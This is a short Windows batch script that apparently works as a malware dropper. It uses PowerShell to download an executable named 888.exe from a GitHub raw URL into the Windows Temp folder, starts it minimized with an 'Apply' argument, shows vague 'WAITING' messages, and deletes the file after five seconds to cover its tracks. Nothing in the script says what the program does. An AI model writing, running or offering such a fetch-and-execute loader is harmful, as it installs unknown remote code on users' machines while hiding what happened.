@echo off
mode con: cols=40 lines=15
set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/888.exe"
set "destination=C:\Windows\Temp\888.exe"
set "arguments=Apply"

echo WAITING FOR LAUNCH...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
echo WAITING ...
start /min "" "%destination%" %arguments%

timeout /t 5 /nobreak >nul 2>&1

echo ........
del "%destination%"